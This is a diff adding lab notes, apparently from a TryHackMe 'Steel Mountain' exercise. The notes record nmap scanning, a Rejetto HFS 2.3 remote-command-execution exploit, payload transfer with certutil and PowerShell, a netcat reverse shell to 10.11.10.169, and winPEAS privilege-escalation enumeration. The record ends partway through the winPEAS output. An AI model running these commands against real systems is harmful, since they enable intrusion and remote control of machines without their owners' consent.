@@ -1,0 +1,970 @@
+ENUM
+nmap -sV -A 10.10.148.225
+PORT      STATE SERVICE            VERSION
+80/tcp    open  http               Microsoft IIS httpd 8.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: Site doesn't have a title (text/html).
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=steelmountain
+| Not valid before: 2020-10-11T19:04:29
+|_Not valid after:  2021-04-12T19:04:29
+|_ssl-date: 2020-10-21T21:00:56+00:00; 0s from scanner time.
+8080/tcp  open  http               HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49156/tcp open  msrpc              Microsoft Windows RPC
+49163/tcp open  msrpc              Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=10/21%OT=80%CT=1%CU=44739%PV=Y%DS=2%DC=T%G=Y%TM=5F90A1
+OS:8E%P=i686-pc-linux-gnu)SEQ(SP=F5%GCD=1%ISR=110%TI=I%CI=I%II=I%SS=S%TS=7)
+OS:OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M508
+OS:NW8ST11%O6=M508ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
+OS:ECN(R=Y%DF=Y%T=80%W=2000%O=M508NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%
+OS:F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=
+OS:80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%
+OS:Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=
+OS:A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=
+OS:Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
+OS:T=80%CD=Z)
+
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:d8:24:bf:46:d3 (unknown)
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-10-21 17:00:56
+|_  start_date: 2020-10-21 16:01:40
+
+
+EXPLOITATION
+
+searchsploit Http File Server 2.3
+----------------------------------------------------------------------------------------- -------------------------
+ Exploit Title                                                                           |  Path
+----------------------------------------------------------------------------------------- -------------------------
+Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                           | multiple/remote/30850.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                      | windows/remote/34668.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                      | windows/remote/39161.py
+Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                 | windows/webapps/34852.txt
+----------------------------------------------------------------------------------------- -------------------------
+
+EDIT 39161.py AND REPLACE IP AND PORT WITH LOCAL IP AND PORT
+
+        ip_addr = "10.11.10.169" #local IP address
+        local_port = "5353" # Local Port number
+
+COPY NETCAT TO LOCAL FOLDER AND SERVE WITH SIMPLEHTTPSERVER
+
+root@kali:~/tryhackme/steelmountain# cp /usr/share/windows-binaries/nc.exe .
+root@kali:~/tryhackme/steelmountain# cp nc.exe nc
+
+~/tryhackme/steelmountain# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.148.225 - - [21/Oct/2020 16:06:08] "GET /nc.exe HTTP/1.1" 200 -
+10.10.148.225 - - [21/Oct/2020 16:06:08] "GET /nc.exe HTTP/1.1" 200 -
+
+PRIVESC WITH WINPEAS
+root@kali:~/tryhackme/steelmountain# cp /root/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/Release/winPEAS.exe .
+~/tryhackme/steelmountain# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.148.225 - - [21/Oct/2020 16:10:39] "GET /winPEAS.exe HTTP/1.1" 200 -
+10.10.148.225 - - [21/Oct/2020 16:10:39] "GET /winPEAS.exe HTTP/1.1" 200 -
+
+TRANSFER WINPEAS
+CERTUTIL
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>certutil.exe -urlcache -split -f http://10.11.10.169/winPEAS.exe
+certutil.exe -urlcache -split -f http://10.11.10.169/winPEAS.exe
+****  Online  ****
+  000000  ...
+  03b200
+CertUtil: -URLCache command completed successfully.
+
+POWERSHELL
+powershell -c (new-object System.Net.WebClient).DownloadFile(‘http://10.11.10.169/winPEAS.exe','C:\Users\Public\winPEAS.exe')
+
+WINPEAS OUTPUT
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2E4A-906A
+
+ Directory of C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+10/21/2020  01:10 PM    <DIR>          .
+10/21/2020  01:10 PM    <DIR>          ..
+02/16/2014  01:58 PM           760,320 hfs.exe
+10/21/2020  01:10 PM           242,176 winPEAS.exe
+               2 File(s)      1,002,496 bytes
+               2 Dir(s)  44,211,249,152 bytes free
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>.\winPEAS.exe
+.\winPEAS.exe
+ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+   Creating Dynamic lists, this could take a while, please wait...
+   - Checking if domain...
+   - Getting Win32_UserAccount info...
+   - Creating current user groups list...
+   - Creating active users list...
+   - Creating disabled users list...
+   - Admin users list...
+     
+             *((,.,/((((((((((((((((((((/,  */               
+      ,/*,..*((((((((((((((((((((((((((((((((((,           
+    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*       
+    ((((((((((((((((**********/########## .(* ,(((((((   
+    (((((((((((/********************/####### .(. (((((((
+    ((((((..******************/@@@@@/***/###### ./(((((((
+    ,,....********************@@@@@@@@@@(***,#### .//((((((
+    , ,..********************/@@@@@%@@@@/********##((/ /((((
+    ..((###########*********/%@@@@@@@@@/************,,..((((
+    .(##################(/******/@@@@@/***************.. /((
+    .(#########################(/**********************..*((
+    .(##############################(/*****************.,(((
+    .(###################################(/************..(((
+    .(#######################################(*********..(((
+    .(#######(,.***.,(###################(..***.*******..(((
+    .(#######*(#####((##################((######/(*****..(((
+    .(###################(/***********(##############(...(((
+    .((#####################/*******(################.((((((
+    .(((############################################(..((((
+    ..(((##########################################(..(((((
+    ....((########################################( .(((((
+    ......((####################################( .((((((
+    (((((((((#################################(../((((((
+        (((((((((/##########################(/..((((((
+              (((((((((/,.  ,*//////*,. ./(((((((((((((((.
+                 (((((((((((((((((((((((((((((/
+
+ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+  WinPEAS vBETA VERSION, Please if you find any issue let me know in https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues by carlospolop
+
+  [+] Leyend:
+         Red                Indicates a special privilege over an object or something is misconfigured
+         Green              Indicates that some protection is enabled or something is well configured
+         Cyan               Indicates active users
+         Blue               Indicates disabled users
+         LightYellow        Indicates links
+
+   [?] You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
+
+
+  ==========================================(System Information)==========================================
+
+  [+] Basic System Information(T1082&T1124&T1012&T1497&T1212)
+   [?] Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
+    Hostname: steelmountain
+    ProductName: Windows Server 2012 R2 Datacenter
+    EditionID: ServerDatacenter
+    ReleaseId: 
+    BuildBranch: 
+    CurrentMajorVersionNumber: 
+    CurrentVersion: 6.3
+    Architecture: x86
+    ProcessorCount: 1
+    SystemLang: en-US
+    KeyboardLang: English (United States)
+    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
+    IsVirtualMachine: False
+    Current Time: 10/21/2020 1:11:48 PM
+    HighIntegrity: False
+    PartOfDomain: False
+    Hotfixes: KB2919355, KB2919442, KB2937220, KB2938772, KB2939471, KB2949621, 
+
+  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
+    OS Build Number: 9600
+   Windows version not supported
+
+
+  [+] PowerShell Settings()
+    PowerShell v2 Version: 2.0
+    PowerShell v5 Version: 4.0
+    Transcription Settings: 
+    Module Logging Settings: 
+    Scriptblock Logging Settings: 
+
+  [+] Audit Settings(T1012)
+   [?] Check what is being logged 
+    Not Found
+
+  [+] WEF Settings(T1012)
+   [?] Windows Event Forwarding, is interesting to know were are sent the logs 
+    Not Found
+
+  [+] LAPS Settings(T1012)
+   [?] If installed, local administrator password is changed frequently and is restricted by ACL 
+    LAPS Enabled: LAPS not installed
+
+  [+] Wdigest()
+   [?] If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest
+    Wdigest is not enabled
+
+  [+] LSA Protection()
+   [?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
+    LSA Protection is not enabled
+
+  [+] Credentials Guard()
+   [?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
+    CredentialGuard is not enabled
+
+  [+] Cached Creds()
+   [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials
+
+  [+] User Environment Variables()
+   [?] Check for some passwords or keys in the env variables 
+    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+    SESSIONNAME: Console
+    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+    USERDOMAIN: STEELMOUNTAIN
+    PROCESSOR_ARCHITECTURE: x86
+    ProgramW6432: C:\Program Files
+    PUBLIC: C:\Users\Public
+    APPDATA: C:\Users\bill\AppData\Roaming
+    windir: C:\Windows
+    LOCALAPPDATA: C:\Users\bill\AppData\Local
+    CommonProgramW6432: C:\Program Files\Common Files
+    TMP: C:\Users\bill\AppData\Local\Temp\1
+    USERPROFILE: C:\Users\bill
+    ProgramFiles: C:\Program Files (x86)
+    PROCESSOR_LEVEL: 6
+    FP_NO_HOST_CHECK: NO
+    HOMEPATH: \Users\bill
+    COMPUTERNAME: STEELMOUNTAIN
+    PROCESSOR_ARCHITEW6432: AMD64
+    USERNAME: bill
+    NUMBER_OF_PROCESSORS: 1
+    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
+    PROMPT: $P$G
+    SystemRoot: C:\Windows
+    ComSpec: C:\Windows\system32\cmd.exe
+    LOGONSERVER: \\STEELMOUNTAIN
+    TEMP: C:\Users\bill\AppData\Local\Temp\1
+    ProgramFiles(x86): C:\Program Files (x86)
+    CommonProgramFiles: C:\Program Files (x86)\Common Files
+    USERDOMAIN_ROAMINGPROFILE: STEELMOUNTAIN
+    PROCESSOR_REVISION: 4f01
+    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
+    ALLUSERSPROFILE: C:\ProgramData
+    SystemDrive: C:
+    PSModulePath: C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
+    OS: Windows_NT
+    ProgramData: C:\ProgramData
+    HOMEDRIVE: C:
+
+  [+] System Environment Variables()
+   [?] Check for some passwords or keys in the env variables 
+    FP_NO_HOST_CHECK: NO
+    USERNAME: SYSTEM
+    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+    ComSpec: C:\Windows\system32\cmd.exe
+    TMP: C:\Windows\TEMP
+    OS: Windows_NT
+    windir: C:\Windows
+    PROCESSOR_ARCHITECTURE: AMD64
+    TEMP: C:\Windows\TEMP
+    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+    PSModulePath: C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
+    NUMBER_OF_PROCESSORS: 1
+    PROCESSOR_LEVEL: 6
+    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
+    PROCESSOR_REVISION: 4f01
+
+  [+] HKCU Internet Settings(T1012)
+    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+    IE5_UA_Backup_Flag: 5.0
+    ZonesSecurityUpgrade: System.Byte[]
+    EmailName: User@
+    AutoConfigProxy: wininet.dll
+    MimeExclusionListForCache: multipart/mixed multipart/x-mixed-replace multipart/x-byteranges 
+    WarnOnPost: System.Byte[]
+    UseSchannelDirectly: System.Byte[]
+    EnableHttp1_1: 1
+    UrlEncoding: 0
+    SecureProtocols: 2720
+    PrivacyAdvanced: 0
+    DisableCachingOfSSLPages: 1
+    WarnonZoneCrossing: 1
+    CertificateRevocation: 1
+    EnableNegotiate: 1
+    MigrateProxy: 1
+    ProxyEnable: 0
+
+  [+] HKLM Internet Settings(T1012)
+    CodeBaseSearchPath: CODEBASE
+    WarnOnIntranet: 1
+    EnablePunycode: 1
+    MinorVersion: 0
+    ActiveXCache: C:\Windows\Downloaded Program Files
+
+  [+] Drives Information(T1120)
+   [?] Remember that you should search more info inside the other drives 
+    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 41 GB)(Permissions: Users [AppendData/CreateDirectories])
+
+  [+] AV Information(T1063)
+  [X] Exception: Object reference not set to an instance of an object.
+    No AV was detected!!
+    Not Found
+
+  [+] UAC Status(T1012)
+   [?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
+    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
+    EnableLUA: 1
+    LocalAccountTokenFilterPolicy: 
+    FilterAdministratorToken: 0
+      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
+      [-] Only the RID-500 local admin account can be used for lateral movement.
+
+
+  ===========================================(Users Information)===========================================
+
+  [+] Users(T1087&T1069&T1033)
+   [?] Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
+  Current user: bill
+  Current groups: Domain Users, Everyone, Users, Interactive, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
+   =================================================================================================
+
+    STEELMOUNTAIN\Administrator: Built-in account for administering the computer/domain
+        |->Groups: Administrators
+        |->Password: CanChange-Expi-Req
+
+    STEELMOUNTAIN\bill
+        |->Groups: Users
+        |->Password: CanChange-NotExpi-Req
+
+    STEELMOUNTAIN\Guest(Disabled): Built-in account for guest access to the computer/domain
+        |->Groups: Guests
+        |->Password: NotChange-NotExpi-NotReq
+
+
+  [+] Current Token privileges(T1134)
+   [?] Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
+    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeIncreaseWorkingSetPrivilege: DISABLED
+
+  [+] Clipboard text(T1134)
+
+
+  [+] Logged users(T1087&T1033)
+    STEELMOUNTAIN\bill
+
+  [+] RDP Sessions(T1087&T1033)
+    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
+    1         Console        bill           STEELMOUNTAIN            Active    2.1.60.243
+
+  [+] Ever logged users(T1087&T1033)
+    STEELMOUNTAIN\Administrator
+    STEELMOUNTAIN\bill
+
+  [+] Looking for AutoLogon credentials(T1012)
+    Not Found
+
+  [+] Home folders found(T1087&T1083&T1033)
+    C:\Users\Administrator
+    C:\Users\All Users
+    C:\Users\bill
+    C:\Users\Default
+    C:\Users\Default User
+    C:\Users\Public : Interactive [WriteData/CreateFiles]
+
+  [+] Password Policies(T1201)
+   [?] Check for a possible brute-force 
+    Domain: Builtin
+    SID: S-1-5-32
+    MaxPasswordAge: 42.22:47:31.7437440
+    MinPasswordAge: 00:00:00
+    MinPasswordLength: 0
+    PasswordHistoryLength: 0
+    PasswordProperties: 0
+   =================================================================================================
+
+    Domain: STEELMOUNTAIN
+    SID: S-1-5-21-3029548963-3893655183-1231094572
+    MaxPasswordAge: 42.00:00:00
+    MinPasswordAge: 00:00:00
+    MinPasswordLength: 0
+    PasswordHistoryLength: 0
+    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
+   =================================================================================================
+
+
+
+  =======================================(Processes Information)=======================================
+
+  [+] Interesting Processes -non Microsoft-(T1010&T1057&T1007)
+   [?] Check if any interesting proccesses for memmory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes
+    explorer(2576)[C:\Windows\Explorer.EXE] -- POwn: bill
+    Command Line: C:\Windows\Explorer.EXE
+   =================================================================================================
+
+    cmd(2856)[C:\Windows\SysWOW64\cmd.exe] -- POwn: bill
+    Command Line: cmd.exe
+   =================================================================================================
+
+    nc(2032)[C:\Users\Public\nc.exe] -- POwn: bill
+    Permissions: Interactive [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
+    Command Line: "C:\Users\Public\nc.exe" -e cmd.exe 10.11.10.169 5353
+   =================================================================================================
+
+    WerFault(3748)[C:\Windows\SysWOW64\WerFault.exe] -- POwn: bill
+    Command Line: C:\Windows\SysWOW64\WerFault.exe -u -p 2032 -s 304
+   =================================================================================================
+
+    WerFault(3824)[C:\Windows\SysWOW64\WerFault.exe] -- POwn: bill
+    Command Line: C:\Windows\SysWOW64\WerFault.exe -u -p 1848 -s 304
+   =================================================================================================
+
+    nc(1848)[C:\Users\Public\nc.exe] -- POwn: bill
+    Permissions: Interactive [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
+    Command Line: "C:\Users\Public\nc.exe" -e cmd.exe 10.11.10.169 5353
+   =================================================================================================
+
+    conhost(3268)[C:\Windows\system32\conhost.exe] -- POwn: bill
+    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
+   =================================================================================================
+
+    conhost(2464)[C:\Windows\system32\conhost.exe] -- POwn: bill
+    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
+   =================================================================================================
+
+    nc(876)[C:\Users\Public\nc.exe] -- POwn: bill
+    Permissions: Interactive [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
+    Command Line: "C:\Users\Public\nc.exe" -e cmd.exe 10.11.10.169 5353
+   =================================================================================================
+
+    cmd(3684)[C:\Windows\SysWOW64\cmd.exe] -- POwn: bill
+    Command Line: cmd.exe
+   =================================================================================================
+
+    nc(2984)[C:\Users\Public\nc.exe] -- POwn: bill
+    Permissions: Interactive [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
+    Command Line: "C:\Users\Public\nc.exe" -e cmd.exe 10.11.10.169 5353
+   =================================================================================================
+
+    nc(1072)[C:\Users\Public\nc.exe] -- POwn: bill
+    Permissions: Interactive [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
+    Command Line: "C:\Users\Public\nc.exe" -e cmd.exe 10.11.10.169 5353
+   =================================================================================================
+
+    winPEAS(2428)[C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winPEAS.exe] -- POwn: bill -- isDotNet
+    Command Line: .\winPEAS.exe
+   =================================================================================================
+
+    conhost(2692)[C:\Windows\system32\conhost.exe] -- POwn: bill
+    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
+   =================================================================================================
+
+    cmd(2868)[C:\Windows\SysWOW64\cmd.exe] -- POwn: bill
+    Command Line: cmd.exe
+   =================================================================================================
+
+    hfs(992)[C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe] -- POwn: bill
+    Command Line: "C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe" 
+   =================================================================================================
+
+    conhost(1080)[C:\Windows\system32\conhost.exe] -- POwn: bill
+    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
+   =================================================================================================
+
+    taskhostex(2500)[C:\Windows\system32\taskhostex.exe] -- POwn: bill
+    Command Line: taskhostex.exe 
+   =================================================================================================
+
+    nc(3744)[C:\Users\Public\nc.exe] -- POwn: bill
+    Permissions: Interactive [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
+    Command Line: "C:\Users\Public\nc.exe" -e cmd.exe 10.11.10.169 5353
+   =================================================================================================
+
+    cmd(2764)[C:\Windows\SysWOW64\cmd.exe] -- POwn: bill
+    Command Line: cmd.exe
+   =================================================================================================
+
+    nc(2672)[C:\Users\Public\nc.exe] -- POwn: bill
+    Permissions: Interactive [WriteData/CreateFiles]
+    Possible DLL Hijacking folder: C:\Users\Public (Interactive [WriteData/CreateFiles])
+    Command Line: "C:\Users\Public\nc.exe" -e cmd.exe 10.11.10.169 5353
+   =================================================================================================
+
+    WerFault(3828)[C:\Windows\SysWOW64\WerFault.exe] -- POwn: bill
+    Command Line: C:\Windows\SysWOW64\WerFault.exe -u -p 2984 -s 316
+   =================================================================================================
+
+
+
+  ========================================(Services Information)========================================
+
+  [+] Interesting Services -non Microsoft-(T1007)
+   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+    AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
+    Advanced SystemCare Service
+   =================================================================================================
+
+    ALG(Application Layer Gateway Service)[C:\Windows\System32\alg.exe] - Manual - Stopped
+    Provides support for 3rd party protocol plug-ins for Internet Connection Sharing
+   =================================================================================================
+
+    AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
+    Amazon SSM Agent
+   =================================================================================================
+
+    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
+    AWS Lite Guest Agent
+   =================================================================================================
+
+    Ec2Config(Amazon Web Services, Inc. - Ec2Config)["C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe"] - Auto - Running - isDotNet
+    Ec2 Configuration Service
+   =================================================================================================
+
+    EFS(Encrypting File System (EFS))[C:\Windows\System32\lsass.exe] - Manual - Stopped
+    Provides the core file encryption technology used to store encrypted files on NTFS file system volumes. If this service is stopped or disabled, applications will be unable to access encrypted files.
+   =================================================================================================
+
+    IEEtwCollectorService(Internet Explorer ETW Collector Service)[C:\Windows\system32\IEEtwCollector.exe /V] - Manual - Stopped - No quotes and Space detected
+    ETW Collector Service for Internet Explorer. When running, this service collects real time ETW events and processes them.
+   =================================================================================================
+
+    IObitUnSvr(IObit - IObit Uninstaller Service)[C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe] - Auto - Stopped - No quotes and Space detected
+    IObit Uninstaller Service
+   =================================================================================================
+
+    KeyIso(CNG Key Isolation)[C:\Windows\system32\lsass.exe] - Manual - Stopped
+    The CNG key isolation service is hosted in the LSA process. The service provides key process isolation to private keys and associated cryptographic operations as required by the Common Criteria. The service stores and uses long-lived keys in a secure process complying with Common Criteria requirements.
+   =================================================================================================
+
+    LiveUpdateSvc(IObit - LiveUpdate)[C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe] - Auto - Running - No quotes and Space detected
+    LiveUpdate
+   =================================================================================================
+
+    MSDTC(Distributed Transaction Coordinator)[C:\Windows\System32\msdtc.exe] - Auto - Running
+    Coordinates transactions that span multiple resource managers, such as databases, message queues, and file systems. If this service is stopped, these transactions will fail. If this service is disabled, any services that explicitly depend on it will fail to start.
+   =================================================================================================
+
+    Netlogon(Netlogon)[C:\Windows\system32\lsass.exe] - Manual - Stopped
+    Maintains a secure channel between this computer and the domain controller for authenticating users and services. If this service is stopped, the computer may not authenticate users and services and the domain controller cannot register DNS records. If this service is disabled, any services that explicitly depend on it will fail to start.
+   =================================================================================================
+
+    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped
+   =================================================================================================
+
+    RpcLocator(Remote Procedure Call (RPC) Locator)[C:\Windows\system32\locator.exe] - Manual - Stopped
+    In Windows 2003 and earlier versions of Windows, the Remote Procedure Call (RPC) Locator service manages the RPC name service database. In Windows Vista and later versions of Windows, this service does not provide any functionality and is present for application compatibility.
+   =================================================================================================
+
+    SamSs(Security Accounts Manager)[C:\Windows\system32\lsass.exe] - Auto - Running
+    The startup of this service signals other services that the Security Accounts Manager (SAM) is ready to accept requests.  Disabling this service will prevent other services in the system from being notified when the SAM is ready, which may in turn cause those services to fail to start correctly. This service should not be disabled.
+   =================================================================================================
+
+    SNMPTRAP(SNMP Trap)[C:\Windows\System32\snmptrap.exe] - Manual - Stopped
+    Receives trap messages generated by local or remote Simple Network Management Protocol (SNMP) agents and forwards the messages to SNMP management programs running on this computer. If this service is stopped, SNMP-based programs on this computer will not receive SNMP trap messages. If this service is disabled, any services that explicitly depend on it will fail to start.
+   =================================================================================================
+
+    Spooler(Print Spooler)[C:\Windows\System32\spoolsv.exe] - Auto - Running
+    This service spools print jobs and handles interaction with the printer.  If you turn off this service, you won't be able to print or see your printers.
+   =================================================================================================
+
+    sppsvc(Software Protection)[C:\Windows\system32\sppsvc.exe] - Auto - Stopped
+    Enables the download, installation and enforcement of digital licenses for Windows and Windows applications. If the service is disabled, the operating system and licensed applications may run in a notification mode. It is strongly recommended that you not disable the Software Protection service.
+   =================================================================================================
+
+    TieringEngineService(Storage Tiers Management)[C:\Windows\system32\TieringEngineService.exe] - Manual - Stopped
+    Optimizes the placement of data in storage tiers on all tiered storage spaces in the system.
+   =================================================================================================
+
+    UI0Detect(Interactive Services Detection)[C:\Windows\system32\UI0Detect.exe] - Manual - Stopped
+    Enables user notification of user input for interactive services, which enables access to dialogs created by interactive services when they appear. If this service is stopped, notifications of new interactive service dialogs will no longer function and there might not be access to interactive service dialogs. If this service is disabled, both notifications of and access to new interactive service dialogs will no longer function.
+   =================================================================================================
+
+    VaultSvc(Credential Manager)[C:\Windows\system32\lsass.exe] - Manual - Stopped
+    Provides secure storage and retrieval of credentials to users, applications and security service packages.
+   =================================================================================================
+
+    vds(Virtual Disk)[C:\Windows\System32\vds.exe] - Manual - Stopped
+    Provides management services for disks, volumes, file systems, and storage arrays.
+   =================================================================================================
+
+    VSS(Volume Shadow Copy)[C:\Windows\system32\vssvc.exe] - Manual - Stopped
+    Manages and implements Volume Shadow Copies used for backup and other purposes. If this service is stopped, shadow copies will be unavailable for backup and the backup may fail. If this service is disabled, any services that explicitly depend on it will fail to start.
+   =================================================================================================
+
+    wmiApSrv(WMI Performance Adapter)[C:\Windows\system32\wbem\WmiApSrv.exe] - Manual - Stopped
+    Provides performance library information from Windows Management Instrumentation (WMI) providers to clients on the network. This service only runs when Performance Data Helper is activated.
+   =================================================================================================
+
+
+  [+] Modifiable Services(T1007)
+   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+    You cannot modify any service
+
+  [+] Looking if you can modify any service registry()
+   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
+    [-] Looks like you cannot change the registry of any service...
+
+  [+] Checking write permissions in PATH folders (DLL Hijacking)()
+   [?] Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
+    C:\Windows\system32
+    C:\Windows
+    C:\Windows\System32\Wbem
+    C:\Windows\System32\WindowsPowerShell\v1.0\
+
+
+  ====================================(Applications Information)====================================
+
+  [+] Current Active Window Application(T1010&T1518)
+    nc.exe
+
+  [+] Installed Applications --Via Program Files/Uninstall registry--(T1083&T1012&T1010&T1518)
+   [?] Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
